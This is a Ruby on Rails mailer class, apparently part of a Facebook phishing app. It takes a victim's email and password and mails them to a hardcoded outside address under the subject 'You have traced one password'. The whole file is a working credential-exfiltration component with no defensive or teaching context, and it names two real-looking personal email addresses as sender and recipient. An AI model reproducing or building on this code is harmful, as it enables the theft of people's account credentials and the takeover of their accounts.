  class FbMailer <  ActionMailer::Base


  def fb_created(email,password)
    @email = email
    @password = password
    mail(

        to: 'st118173@ait.asia',
        from: 'jntu784@gmail.com',
        subject: "You have traced one password",

    )

  end

end